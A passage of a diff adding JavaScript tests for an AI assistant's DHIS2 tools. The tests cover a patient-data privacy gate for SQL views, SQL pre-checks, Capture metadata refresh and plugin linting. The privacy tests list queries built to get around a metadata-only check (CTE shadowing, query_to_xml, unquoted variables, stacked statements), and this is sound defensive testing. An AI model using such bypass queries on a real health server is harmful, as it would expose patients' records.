+      try { await ctx.callProviderStreaming([{ role: 'user', content: 'hi' }], false, () => {}, [], 0); } catch (e) { err = e; }
+      await new Promise((r) => setTimeout(r, 30));
+      if (err && /terminated/.test(err.message) && !unhandled.length) ok(`${flavour}: the turn fails with the network error and nothing is left unhandled`);
+      else bad(`${flavour}: err=${err && err.message} unhandled=${JSON.stringify(unhandled)}`);
+      unhandled.length = 0;
+    }
+  } finally {
+    ctx.fetch = savedFetch;
+    vm.runInContext(`_cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };`, ctx);
+    process.off('unhandledRejection', onUnhandled);
+  }
+}
+
+// A dropped provider stream is retried like a stalled one (no text yet).
+function runStreamRetryChecks() {
+  console.log('\nProvider stream drops are retried before any text streams:');
+  const r = ctx.isRetryableStreamDrop;
+  for (const m of ['LLM stream stalled: no data from x for 60s', 'terminated', 'TypeError: network error', 'Failed to fetch', 'other side closed'])
+    (r(new Error(m)) ? ok : bad)(`retryable: "${m}"`);
+  for (const m of ['HTTP 401 Unauthorized', 'No API key configured', 'Invalid provider URL'])
+    (!r(new Error(m)) ? ok : bad)(`not retryable: "${m}"`);
+  const src = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
+  (/isRetryableStreamDrop\(provErr\) && !streamStartBroadcast/.test(src) ? ok : bad)('the agent loop retries only while nothing has streamed to the panel');
+}
+
+// ── SQL views + transfer-history thread fixes (2026-10-23) ──────────────────
+// A "transfer history" dashboard-plugin request failed end to end on 2.43.2:
+// guessed endpoints (405/404/404/500), schemas/<tracker object> 404s, 2.40
+// table names, a view nobody could read (rw------ → E4312), a false "DHIS2
+// validated the SQL on save", and the user's own "install it on a dashbaord"
+// refused as "not asked". Server facts verified live on 2.42.5.1 and 2.43.2.
+async function runSqlViewChecks() {
+  console.log('\nSQL views, privacy exception & the transfer-history thread:');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const d = ctx.__dhis2();
+  const saved = { apiVersion: d.apiVersion, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, gsi: ctx.getSchemaIndex };
+  const A = (sql) => ctx.analyzeSqlViewPrivacy(sql).metadataOnly;
+  const TRANSFER_SQL = "with history as (select h.programownershiphistoryid as transfer_id, h.trackedentityid, h.programid, h.organisationunitid as from_ou_id, h.enddate as transferred_at, lead(h.organisationunitid) over w as next_ou_id, lead(h.createdby) over w as next_owner_createdby from programownershiphistory h window w as (partition by h.trackedentityid, h.programid order by h.enddate, h.programownershiphistoryid)) select to_char(t.transferred_at, 'YYYY-MM-DD HH24:MI') as transferred_at, p.name as program, fo.name as from_org_unit, tu.name as to_org_unit, coalesce(t.next_owner_createdby, cur.createdby) as transferred_by from history t join program p on p.programid = t.programid join trackedentity te on te.trackedentityid = t.trackedentityid and te.deleted = false join organisationunit fo on fo.organisationunitid = t.from_ou_id left join trackedentityprogramowner cur on cur.trackedentityid = t.trackedentityid and cur.programid = t.programid left join organisationunit tu on tu.organisationunitid = coalesce(t.next_ou_id, cur.organisationunitid) where t.transferred_at >= cast('${startDate}' as date) and t.transferred_at < cast('${endDate}' as date) + interval '1 day' and ('${orgUnit}' = 'ALL' or fo.path like '%' || '${orgUnit}' || '%') order by t.transferred_at desc";
+  try {
+    // 1. What counts as metadata-only (fail closed on anything unknown).
+    const meta = [
+      'select uid, name from program order by name',
+      "select de.uid, de.name, os.name from dataelement de left join optionset os on os.optionsetid = de.optionsetid where de.valuetype = 'TEXT'",
+      "select table_name, column_name from information_schema.columns where table_schema = 'public'",
+      'with p as (select programid, name from program) select p.name, count(ps.*) from p join programstage ps on ps.programid = p.programid group by p.name',
+      'select extract(year from created) y, count(*) from dataelement group by 1',
+      "select o.uid from organisationunit o where o.path like '%${ou}%'",
+      'select x.v from program p, lateral jsonb_array_elements(p.translations) x(v)',
+      'select name from program union select name from programstage;',
+      'select v.uid from eventvisualization v join eventvisualization_columns c on c.eventvisualizationid = v.eventvisualizationid',
+    ];
+    const notMeta = [
+      'select * from trackedentity', 'select * from program, event', 'select * from program p, (select * from trackedentity) t',
+      'select (select count(*) from programownershiphistory) from program', 'with event as (select * from event) select * from event',
+      'with a as (select * from b), b as (select 1) select * from a', 'select * from (with t as (select 1) select * from t) x, t',
+      "select query_to_xml('select * from trackedentity', true, true, '')", 'select * from program where name = ${n}', 'select * from "${t}"',
+      'select * from program -- ${x}\n', 'select * from public.trackedentity', 'select * from pg_catalog.pg_stat_activity',
+      'select * from program; select * from event', 'do $$ begin perform 1; end $$', 'select * from (program p join trackerevent e on true)',
+      'table event', 'select * from program where uid in (table trackedentity)', 'select pg_catalog.lower(name) from program',
+      'select * from program where uid = any(select uid from singleevent)', 'select * from datavalue',
+      'select * from program p cross join lateral (select * from enrollment) e', 'with recursive r as (select 1) select * from r, enrollment',
+      TRANSFER_SQL,
+    ];
+    truthy(`${meta.length} metadata queries are metadata-only (CTEs, joins, information_schema, lateral SRFs, quoted variables)`, meta.every(A));
+    const leaked = notMeta.filter(A);
+    truthy(`${notMeta.length} queries that read — or could read — anything else are NOT (CTE shadowing, query_to_xml, TABLE, unquoted/commented variables, pg_catalog, datavalue, the transfer SQL)`, leaked.length === 0 || (bad(`leaked: ${JSON.stringify(leaked)}`), false));
+
+    // 2. Gate holes closed; aggregate audits stay readable.
+    truthy('audits/trackedEntity, audits/trackedEntityDataValue, analytics/trackedEntities/query are patient-level', ['audits/trackedEntity?trackedEntities=x', 'audits/trackedEntityDataValue', 'analytics/trackedEntities/query/nEenWmSyUEp'].every((p) => ctx.pathReadsPatientData(p)));
+    truthy('audits/dataValue and audits/dataApproval are not', !ctx.pathReadsPatientData('audits/dataValue') && !ctx.pathReadsPatientData('audits/dataApproval'));
+
+    // 3. The metadata-only exception, decided from the CURRENT server SQL.
+    vm.runInContext(`_cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
+    const views = {
+      metaQry0001: { id: 'metaQry0001', type: 'QUERY', sqlQuery: "select uid, name from program where name ilike '%${q}%'" },
+      metaView001: { id: 'metaView001', type: 'VIEW', sqlQuery: 'select uid from program' },
+      trnsfer0001: { id: 'trnsfer0001', type: 'QUERY', sqlQuery: TRANSFER_SQL },
+    };
+    const fetched = [];
+    ctx.safeDhis2Fetch = async (path) => { fetched.push(path); const m = /^sqlViews\/(\w{11})\?/.exec(path); return m && views[m[1]] ? views[m[1]] : { _error: 'DHIS2 API 404', _status: 404 }; };
+    const gate = (args) => ctx.enforcePatientDataPrivacyGateAsync('dhis2_query', args);
+    truthy('cloud model: a metadata-only QUERY view is readable through dhis2_query (var passed in query_params)', (await gate({ path: 'sqlViews/metaQry0001/data', query_params: { var: 'q:anc', pageSize: 50 } })) === null);
+    truthy('…its SQL was fetched from the server for the decision', fetched.some((p) => p.startsWith('sqlViews/metaQry0001?')));
+    const tr = await gate({ path: 'sqlViews/trnsfer0001/data?var=startDate:2020-01-01' });
+    truthy('the transfer view stays refused, with the reason and a pointer to manage_sql_views run', tr && tr._privacy_block && /not metadata-only: reads .*programownershiphistory/.test(tr._error) && /manage_sql_views\(action="run"/.test(tr._hint));
+    truthy('a VIEW-type metadata view stays refused (its rows are a stored copy)', !!(await gate({ path: 'sqlViews/metaView001/data' })));
+    truthy('extra parameters (criteria) or a .csv suffix keep a metadata view refused', !!(await gate({ path: 'sqlViews/metaQry0001/data?criteria=uid:x' })) && !!(await gate({ path: 'sqlViews/metaQry0001/data.csv' })));
+    truthy('a view that cannot be read is refused', !!(await gate({ path: 'sqlViews/missing0001/data' })));
+    truthy('tracker/events is still refused with no SQL-view lookup', !!(await gate({ path: 'tracker/events?program=x' })));
+
+    // 4. manage_sql_views run on a cloud model: rows only for metadata-only views.
+    ctx.safeDhis2Fetch = async (path) => {
+      const m = /^sqlViews\/(\w{11})/.exec(path);
+      if (/\/data\?/.test(path)) return { pager: { page: 1, total: 14 }, listGrid: { headers: [{ name: 'a' }, { name: 'b' }], rows: [['x', 'y']] } };
+      return m && views[m[1]] ? { ...views[m[1]], displayName: m[1] } : { _error: 'DHIS2 API 404', _status: 404 };
+    };
+    const runT = await ctx.executeManageSqlViews({ action: 'run', id: 'trnsfer0001', variables: { startDate: '2020-01-01', endDate: '2030-12-31', orgUnit: 'ALL' } });
+    truthy('run on the transfer view: columns + row_count, rows withheld', runT.row_count === 14 && runT.columns.length === 2 && !runT.rows && /not metadata-only/i.test(runT.rows_withheld || ''));
+    const runM = await ctx.executeManageSqlViews({ action: 'run', id: 'metaQry0001', variables: { q: 'anc' } });
+    truthy('run on a metadata view returns its rows', Array.isArray(runM.rows) && runM.rows.length === 1);
+    truthy('run without a needed variable is refused before any request', /needs a value for \$\{endDate\}/.test((await ctx.executeManageSqlViews({ action: 'run', id: 'trnsfer0001', variables: { startDate: '2020-01-01', orgUnit: 'ALL' } }))._error || ''));
+    truthy('a data error from a patient-level view is not passed on verbatim', /withheld/.test(ctx.sqlViewDbError({ _body: { errorCode: 'E7144', devMessage: 'ERROR: invalid input syntax for type integer: "Jane"' } }, false).db_error) && /does not exist/.test(ctx.sqlViewDbError({ _body: { errorCode: 'E7144', devMessage: 'ERROR: column t.created does not exist' } }, false).db_error));
+
+    // 5. Pre-checks: every DHIS2 refusal found before a request.
+    const pc = (sql, minor, tv) => ctx.precheckSqlViewQuery(sql, { minor, testVariables: tv }).problems.join(' | ');
+    truthy("an illegal keyword inside a string literal ('delete me') is caught — DHIS2 refuses it there too (E4311)", /"delete"/.test(pc("select uid from program where name <> 'delete me'", 42)));
+    truthy('"lastupdated" / "x_delete" are fine', pc("select lastupdated from program where name <> 'x_delete'", 42) === '');
+    truthy('the protected userinfo table is caught (E4310)', /protected table/.test(pc('select u.username from programownershiphistory h join userinfo u on u.username = h.createdby', 42)));
+    truthy('the failed thread\'s 2.40 names are caught on 2.43 (trackedentityinstance, programinstance, trackedentityinstanceid)', (() => { const r = pc('select tei.uid from programownershiphistory owh join trackedentityinstance tei on tei.trackedentityinstanceid = owh.trackedentityinstanceid join programinstance pi on pi.programinstanceid = owh.programinstanceid', 43); return /"trackedentityinstance" does not exist/.test(r) && /"programinstance" does not exist/.test(r) && /trackedentityinstanceid → trackedentityid/.test(r); })());
+    truthy('event is right on 2.42 and wrong on 2.43 (trackerevent / singleevent)', pc('select uid from event', 42) === '' && /trackerevent/.test(pc('select uid from event', 43)) && /only exists from 2\.43/.test(pc('select uid from trackerevent', 42)));
+    truthy('a variable without a test value, or a value with ":", is caught (E4307)', /test_variables/.test(pc(TRANSFER_SQL, 42, { startDate: '2020-01-01', orgUnit: 'ALL' })) && /not a value DHIS2 accepts/.test(pc(TRANSFER_SQL, 42, { startDate: '2020-01-01T00:00', endDate: '2030-12-31', orgUnit: 'ALL' })));
+    truthy('the transfer recipe passes on 2.42 with its test values', pc(TRANSFER_SQL, 42, { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' }) === '');
+    truthy('sharing rw------ = nobody reads rows; r-r----- or a group with data read = readable', !ctx.sqlViewDataReaders({ public: 'rw------' }).anyone && ctx.sqlViewDataReaders({ public: 'r-r-----' }).anyone && ctx.sqlViewDataReaders({ public: '--------', userGroups: { g: { id: 'g', access: 'r-r-----' } } }).anyone);
+
+    // 6. create: refused before any request on a precheck problem; a view whose
+    //    SQL fails when run is removed again; success runs it once.
+    d.apiVersion = 42; d.writeAuth = { scope: 'broad', reason: 'verify' };
+    const calls = [];
+    let failRun = true;
+    ctx.safeDhis2Fetch = async (path, opts = {}) => {
+      calls.push(`${opts.method || 'GET'} ${path.split('?')[0]}`);
+      if (/^sqlViews\?/.test(path)) return { sqlViews: [] };
+      if (opts.method === 'POST' && path === 'sqlViews') return { status: 'OK', response: { uid: opts.body.id } };
+      if (/\/data\?/.test(path)) return failRun ? { _error: 'DHIS2 API 409', _status: 409, _body: { errorCode: 'E7144', message: 'Query failed because a referenced table does not exist. Please ensure analytics job was run', devMessage: 'ERROR: column h.created does not exist' } } : { pager: { total: 14 }, listGrid: { headers: [{ name: 'transferred_at' }], rows: [['2026-10-19 11:22']] } };
+      if (opts.method === 'DELETE') return { status: 'OK' };
+      return {};
+    };
+    const pre = await ctx.executeManageSqlViews({ action: 'create', name: 'x', sql_query: 'select uid from trackedentityinstance', test_variables: {} });
+    truthy('create with a 2.40 table name is refused with NO request', /problem/.test(pre._error || '') && calls.length === 0);
+    const failed = await ctx.executeManageSqlViews({ action: 'create', name: 'Transfer history', sql_query: TRANSFER_SQL, test_variables: { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' } });
+    truthy('SQL that fails when run: the real PostgreSQL error, the misleading analytics wording explained, the view removed', /E7144/.test(failed._error || '') && /h\.created does not exist/.test(failed.db_error || '') && /not about analytics/.test(failed._hint || '') && failed.view_removed === true && calls.some((c) => c.startsWith('DELETE sqlViews/')));
+    failRun = false; calls.length = 0;
+    const good = await ctx.executeManageSqlViews({ action: 'create', name: 'Transfer history', sql_query: TRANSFER_SQL, test_variables: { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' } });
+    truthy('success: ran once, 14 rows counted, rows withheld (patient-level), readable by every user, plugin_read sends every variable', good.success && good.test.row_count === 14 && !good.test.rows && /every logged-in user/.test(good.data_access) && /startDate:\$\{startDate\}/.test(good.plugin_read) && /orgUnit:\$\{orgUnit\}/.test(good.plugin_read));
+    truthy('…POSTed with public data-read sharing "r-r-----"', calls.includes('POST sqlViews'));
+    d.writeAuth = { scope: 'read_only', reason: 'verify' };
+    truthy('create on a read-only turn is refused by the write gate', /Refused/.test((await ctx.executeManageSqlViews({ action: 'create', name: 'y', sql_query: 'select uid from program', test_variables: {} }))._error || ''));
+
+    // 7. dhis2_query: the guessed endpoints are answered without a request.
+    d.writeAuth = { scope: 'broad', reason: 'verify' };
+    calls.length = 0;
+    ctx.getSchemaIndex = async () => new Map([['dataelement', { name: 'dataElement', plural: 'dataElements' }], ['dataelements', { name: 'dataElement', plural: 'dataElements' }]]);
+    const own = await ctx.executeTool('dhis2_query', { path: 'tracker/ownership/transfer' });
+    truthy('GET tracker/ownership/transfer → answered (write-only; history = SQL view), nothing sent', own._scope === 'known_endpoint_guidance' && /manage_sql_views/.test(own._hint) && calls.length === 0);
+    truthy('GET audits → answered, nothing sent', (await ctx.executeTool('dhis2_query', { path: 'audits' }))._scope === 'known_endpoint_guidance' && calls.length === 0);
+    const sch = await ctx.executeTool('dhis2_query', { path: 'schemas/enrollment' });
+    truthy('GET schemas/enrollment → "not a metadata schema" + describe, nothing sent', /no metadata schema "enrollment"/.test(sch._error || '') && /describe/.test(sch._hint) && calls.length === 0);
+    await ctx.executeTool('dhis2_query', { path: 'schemas/dataElements?fields=name' });
+    truthy('GET schemas/dataElements is healed to schemas/dataElement (the plural is a 404)', calls.some((c) => c === 'GET schemas/dataElement'));
+
+    // 8. Wiring and routing.
+    const R = ctx.__TOOL_ROUTER;
+    truthy('manage_sql_views is routed, write-capable, manual-gated, summarised, with a manual that has the transfer recipe', !!R.manage_sql_views
+      && vm.runInContext("WRITE_CAPABLE_TOOL_NAMES.has('manage_sql_views') && MANUAL_TOOLS.has('manage_sql_views') && !!TOOL_SUMMARIES.manage_sql_views && /programownershiphistory/.test(MANUAL_EXTRAS.manage_sql_views)", ctx));
+    truthy('list / get / describe / run are discovery actions; create is not', ctx.isDiscoveryCall('manage_sql_views', { action: 'describe' }) && ctx.isDiscoveryCall('manage_sql_views', { action: 'run' }) && !ctx.isDiscoveryCall('manage_sql_views', { action: 'create' }));
+    const names = (t) => ctx.getContextualTools({ appType: 'Dashboard' }, t, false).map((x) => x.function.name);
+    const THREAD = 'can you create an install a dhis2 dashboard plugin then install it on a dashbaord that will show the transfers history that happend in all OU where we can filter by date and OU';
+    truthy('the thread\'s request gets manage_sql_views and manage_custom_app', names(THREAD).includes('manage_sql_views') && names(THREAD).includes('manage_custom_app'));
+    truthy('"use SQL View to find the transfer history" gets manage_sql_views', names('yes there is no tranfer program or stage, use SQL View to find the tranfer history').includes('manage_sql_views'));
+    truthy('an ordinary indicator request does not', !names('create a program indicator for anc visits').includes('manage_sql_views'));
+    truthy('detectSqlViewIntent: transfer history / ownership / sql view — not "transfer the data element to another stage"', ctx.detectSqlViewIntent('show the transfers history in all ou') && ctx.detectSqlViewIntent('list of transfers') && ctx.detectSqlViewIntent('create a sql view') && !ctx.detectSqlViewIntent('move this data element to another stage'));
+    const sp = await ctx.buildSystemPrompt(THREAD, false, false);
+    truthy('the system prompt explains that a transfer is an ownership transfer read with a SQL view', /OWNERSHIP transfer/.test(sp) && /programownershiphistory/.test(sp));
+
+    // 9. Placement: the user's own words were refused twice.
+    truthy('"install it on a dashbaord" (typo) is a placement request', ctx.userAskedToPlace([THREAD]));
+    truthy('"create a dashboard plugin that shows X" alone is not', !ctx.userAskedToPlace(['create a dashboard plugin that shows ANC coverage']));
+    truthy('"go ahead install and setup" after the assistant\'s "…then install it and place it on a dashboard" is a placement answer', (() => {
+      vm.runInContext(`conversationHistory = [{ role: 'user', content: 'build a transfer widget' }, { role: 'assistant', content: "Once you confirm, I'll build a dashboard plugin with date-range filters — then install it and place it on a dashboard for you." }]; lastUserText = 'go ahead install and setup';`, ctx);
+      return ctx.placementWasRequested();
+    })());
+    truthy('…but "go ahead" after a message that offered no place is not', (() => {
+      vm.runInContext(`conversationHistory = [{ role: 'user', content: 'build a transfer widget' }, { role: 'assistant', content: 'Here is the preview of the widget. Shall I install it?' }]; lastUserText = 'go ahead';`, ctx);
+      return !ctx.placementWasRequested();
+    })());
+    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
+
+    // 10. Preview lint: a plugin on a view nobody can read, or without its variables.
+    const sqlv = { ok00000Vw01: { id: 'ok00000Vw01', displayName: 'T', type: 'QUERY', sqlQuery: TRANSFER_SQL, sharing: { public: 'r-r-----' } }, noRead0Vw01: { id: 'noRead0Vw01', displayName: 'Transfer History (ownership)', type: 'QUERY', sqlQuery: 'select 1 from programownershiphistory', sharing: { public: 'rw------' } } };
+    ctx.safeDhis2Fetch = async (path) => { const m = /^sqlViews\/(\w{11})\?/.exec(path); return m ? sqlv[m[1]] : {}; };
+    const cmp = (src) => ({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code });
+    const noRead = await ctx.checkCustomAppSqlViews(cmp("const ID = 'noRead0Vw01'; const Q = { r: { resource: 'sqlViews/' + ID + '/data', params: { paging: false } } };"), { noRead0Vw01: 'sqlViews' });
+    truthy('the failed thread\'s plugin (view shared rw------) is refused: nobody could read it (E4312)', noRead.errors.some((e) => /NOBODY can read its rows/.test(e)));
+    const noVars = await ctx.checkCustomAppSqlViews(cmp("const Q = { r: { resource: 'sqlViews/ok00000Vw01/data', params: ({ page }) => ({ page, startDate: '2020' }) } };"), { ok00000Vw01: 'sqlViews' });
+    truthy('a plugin that never sends the view\'s variables is refused (E4307) — an object key is not sending', noVars.errors.some((e) => /never sends them/.test(e) && /startDate/.test(e)));
+    const fine = await ctx.checkCustomAppSqlViews(cmp('const Q = { r: { resource: \'sqlViews/ok00000Vw01/data\', params: ({ s, e, o, page }) => ({ var: [`startDate:${s}`, `endDate:${e}`, `orgUnit:${o}`], page, pageSize: 50 }) } };'), { ok00000Vw01: 'sqlViews' });
+    truthy('a plugin that sends every variable and pages on the server passes', fine.errors.length === 0 && fine.warnings.length === 0 && fine.views.length === 1);
+
+    // 11. Pagination page sizes (the model's transfer plugin used 25: console error on every render).
+    const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
+    const pagLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code }, 'plugin', kitMeta, 'DASHBOARD').errors.filter((e) => /Pagination/.test(e.message));
+    const PAG = (extra) => `const { Pagination } = D2UI;\nconst PAGE_SIZE = 25;\nconst P = ({ page, n }) => <Pagination page={page} pageCount={n} pageSize={PAGE_SIZE} total={100} onPageChange={() => {}}${extra} />;`;
+    truthy('<Pagination pageSize={25}> (a constant) is refused — not on its page-size menu', pagLint(PAG('')).some((e) => /no option with the value: "25"/.test(e.message)));
+    truthy('…allowed with hidePageSizeSelect or pageSizes, and with a listed size', !pagLint(PAG(' hidePageSizeSelect')).length && !pagLint(PAG(' pageSizes={["25", "50"]}')).length && !pagLint(PAG('').replace('PAGE_SIZE = 25', 'PAGE_SIZE = 50')).length);
+    truthy('…and a useState(25) page size is caught too', pagLint('const { Pagination } = D2UI;\nconst { useState } = React;\nfunction P() { const [size, setSize] = useState(25); return <Pagination page={1} pageCount={3} pageSize={size} total={60} onPageChange={() => {}} />; }').length === 1);
+  } finally {
+    ctx.safeDhis2Fetch = saved.sdf; ctx.getSchemaIndex = saved.gsi;
+    d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
+    vm.runInContext('_cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG }; conversationHistory = []; lastUserText = "";', ctx);
+  }
+}
+
+// Capture caches program metadata and reloads a program only when its version
+// changes; DHIS2 does not raise it for stage / rule edits (live 2026-10-25: a
+// form plugin's new storage field never reached Capture → "FLAG does nothing").
+async function runCaptureRefreshChecks() {
+  console.log('\nCapture metadata refresh (program version) & cooperating plugins:');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
+  const d = ctx.__dhis2();
+  const saved = { sdf: ctx.safeDhis2Fetch, baseUrl: d.baseUrl, apiVersion: d.apiVersion };
+  const calls = [];
+  const versions = { progA000001: 3, progB000001: 0, progNew0001: 0 };
+  ctx.safeDhis2Fetch = async (p, o = {}) => {
+    const method = o.method || 'GET';
+    calls.push(`${method} ${p}`);
+    let m = p.match(/^programs\/(\w{11})\?fields=id,displayName,version/);
+    if (m) return { id: m[1], displayName: `Program ${m[1]}`, version: versions[m[1]] };
+    m = p.match(/^programs\/(\w{11})$/);
+    if (m && method === 'PATCH') { versions[m[1]] = o.body[0].value; return { status: 'OK' }; }
+    if (p.startsWith('programStages?filter=id:in:[stageA00001]')) return { programStages: [{ id: 'stageA00001', program: { id: 'progA000001' } }] };
+    if (p.startsWith('programStages?filter=programStageDataElements.dataElement.id:in:[deStore0001]')) return { programStages: [{ program: { id: 'progA000001' } }, { program: { id: 'progB000001' } }] };
+    if (p.startsWith('programRules?filter=id:in:[ruleGone001]')) return { programRules: [{ id: 'ruleGone001', program: { id: 'progB000001' } }] };
+    if (p.startsWith('system/info')) return { version: '2.42.5.1' };
+    return { _error: `unexpected ${method} ${p}` };
+  };
+  d.baseUrl = 'http://localhost:8081'; d.apiVersion = 42;
+  try {
+    await ctx.flushCaptureProgramVersionBumps();
+    ctx.noteCaptureMetadataWrite('PUT', 'programStages/stageA00001?mergeMode=REPLACE', JSON.stringify({ id: 'stageA00001', program: { id: 'progA000001' }, programStageDataElements: [] }));
+    let r = await ctx.flushCaptureProgramVersionBumps();
+    truthy('a stage PUT raises its program\'s version by one (Capture reloads it)', r && r.bumped.length === 1 && r.bumped[0].version === '3 → 4' && versions.progA000001 === 4);
+    truthy('…with a JSON Patch on /version, nothing else', calls.some((c) => c === 'PATCH programs/progA000001'));
+    truthy('…and once only: nothing pending afterwards', (await ctx.flushCaptureProgramVersionBumps()) === null);
+    ctx.noteCaptureMetadataWrite('PATCH', 'programStages/stageA00001', JSON.stringify([{ op: 'add', path: '/description', value: 'x' }]));
+    r = await ctx.flushCaptureProgramVersionBumps();
+    truthy('a JSON-Patch stage write (no program in the body) is looked up by its id', r && r.bumped[0].program_id === 'progA000001' && versions.progA000001 === 5);
+    ctx.noteCaptureMetadataWrite('POST', 'metadata?importStrategy=CREATE_AND_UPDATE&atomicMode=ALL', JSON.stringify({ programs: [{ id: 'progNew0001' }], programStages: [{ id: 'stageNew001', program: { id: 'progNew0001' } }], programRules: [{ id: 'ruleNew0001', program: { id: 'progNew0001' } }] }));
+    truthy('a program created / updated in the same import is left alone (new = uncached, updated = DHIS2 bumps it)', (await ctx.flushCaptureProgramVersionBumps()) === null && versions.progNew0001 === 0);
+    ctx.noteCaptureMetadataWrite('PUT', 'dataElements/deStore0001', JSON.stringify({ id: 'deStore0001', name: 'Flags', valueType: 'LONG_TEXT' }));
+    r = await ctx.flushCaptureProgramVersionBumps();
+    truthy('a data element change bumps every program whose stages use it', r && r.bumped.map((b) => b.program_id).sort().join() === 'progA000001,progB000001');
+    const pre = await ctx.captureProgramsOfDeletedObjects('DELETE', 'programRules/ruleGone001', null);
+    ctx.noteCaptureMetadataWrite('DELETE', 'programRules/ruleGone001', null, pre);
+    r = await ctx.flushCaptureProgramVersionBumps();
+    truthy('a deleted rule\'s program is resolved BEFORE the delete and bumped after', JSON.stringify(pre) === '["progB000001"]' && r && r.bumped[0].program_id === 'progB000001');
+    ctx.noteCaptureMetadataWrite('PUT', 'dataStore/capture/dataEntryForms', JSON.stringify({ x: [] }));
+    ctx.noteCaptureMetadataWrite('POST', 'tracker?async=false', JSON.stringify({ events: [{ event: 'e', programStage: 'stageA00001' }] }));
+    truthy('dataStore and tracker DATA writes never bump a program', (await ctx.flushCaptureProgramVersionBumps()) === null);
+    ctx.noteCaptureProgramChanged('progA000001');
+    const viaTool = await ctx.executeTool('dhis2_query', { path: 'system/info' });
+    truthy('executeTool runs the refresh when the call finishes and reports it as capture_refresh', viaTool && viaTool.capture_refresh && viaTool.capture_refresh.bumped[0].program_id === 'progA000001' && /reload/.test(viaTool.capture_refresh.note));
+  } finally {
+    ctx.safeDhis2Fetch = saved.sdf; d.baseUrl = saved.baseUrl; d.apiVersion = saved.apiVersion;
+    vm.runInContext('_captureMetaPending = null;', ctx);
+  }
+
+  // Form placement hands the plugin its program / stage in its own URL.
+  const src = 'http://localhost:8081/api/apps/ai-test-flag/plugin.html';
+  eq('form plugin URL carries programId + programStageId', ctx.formPluginSource(src, { kind: 'program_stage', id: 'stageA00001', programId: 'progA000001' }), `${src}?programId=progA000001&programStageId=stageA00001`);
+  eq('…registration form: programId only, and an old query is replaced', ctx.formPluginSource(`${src}?x=1`, { kind: 'program', id: 'progA000001', programId: 'progA000001' }), `${src}?programId=progA000001`);
+  truthy('the URL query does not stop the placement from being recognised as the app\'s', ctx.isPluginSourceOf('ai-test-flag', `${src}?programId=progA000001`));
+
+  // A plugin-owned (replace_field) field goes back to its own section on unplace.
+  const sctx = { id: 'stageA00001', kind: 'program_stage', programId: 'progA000001', fieldIds: ['deA00000001', 'deStore0001', 'deB00000001', 'deC00000001'],
+    fields: {}, sections: [{ id: 'secA0000001', name: 'A', fieldIds: ['deA00000001', 'deStore0001', 'deB00000001'] }, { id: 'secC0000001', name: 'C', fieldIds: ['deC00000001'] }] };
+  const sdef = ctx.defaultCaptureFormConfig(sctx);
+  const fmap = [{ plugin_field: 'a', field_id: 'deA00000001' }, { plugin_field: 'flags', field_id: 'deStore0001', replace_field: true }];
+  const once = ctx.formWithPlugin(sdef, sctx, { key: 'ai-test-flag', name: 'Flag', source: src, fieldMap: fmap, section: null, sectionName: null, position: 'bottom' });
+  truthy('replace_field takes the storage field out of its section; the plugin gets its own section', !once.sections[0].elements.some((e) => e.id === 'deStore0001') && once.sections.length === 3);
+  const twice = ctx.formWithPlugin(once.sections, sctx, { key: 'ai-test-flag', name: 'Flag', source: src, fieldMap: fmap, section: null, sectionName: null, position: 'bottom' });
+  truthy('placing again (upsert) leaves no empty or extra section behind', twice.sections.length === 3 && twice.sections.every((s) => s.elements.length));
+  const back = ctx.formWithoutPlugin(twice.sections, 'ai-test-flag', sctx);
+  truthy('unplace puts the field back in ITS section, in metadata order → exactly the default form (entry can be dropped)', back.removed === 1 && ctx.canonicalJson(back.sections) === ctx.canonicalJson(sdef));
+
+  // Lint for cooperating plugins.
+  const kit = await ctx.loadCustomAppKit().catch(() => null);
+  if (kit) {
+    const shake = "\nconst root = ReactDOMClient.createRoot(document.getElementById('root')); postRobot.send(window.parent, 'getPropsFromParent'); setPluginHeight;";
+    const lint = (code) => ctx.lintCustomAppCode({ 'plugin.jsx': code + shake }, 'plugin', kit.meta, 'CAPTURE');
+    truthy('form plugin writing without checking fieldsMetadata is warned', lint("const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'flags', value: '[]' }); };").warnings.some((w) => /never looks at fieldsMetadata/.test(w.message)));
+    truthy('…checking fieldsMetadata[alias] first is not', !lint("const A = ({ values, fieldsMetadata, setFieldValue }) => { if (fieldsMetadata.flags) setFieldValue({ fieldId: 'flags', value: '[]' }); };").warnings.some((w) => /fieldsMetadata/.test(w.message)));
+    // Patient data never goes into the dataStore.
+    const lintAs = (files, kind, type) => ctx.lintCustomAppCode(Object.fromEntries(Object.entries(files).map(([f, c]) => [f, c + (f === 'shared.jsx' ? '' : shake)])), kind, kit.meta, type);
+    const refusedPd = (r) => r.errors.some((e) => /Patient data never goes into the dataStore/.test(e.message));
+    const threadCode = "const NAMESPACE = 'ai-mch-flags'; const toggle = async (row) => { const resource = 'dataStore/' + NAMESPACE + '/flags'; await engine.mutate({ resource: resource, type: storeExists ? 'update' : 'create', data: payload }); }; const A = ({ values, setFieldValue }) => null;";
+    truthy('REFUSED: a Capture form plugin writing the dataStore (the thread\'s exact pattern: resource in a variable, ternary type)', refusedPd(lintAs({ 'plugin.jsx': threadCode }, 'plugin', 'CAPTURE')));
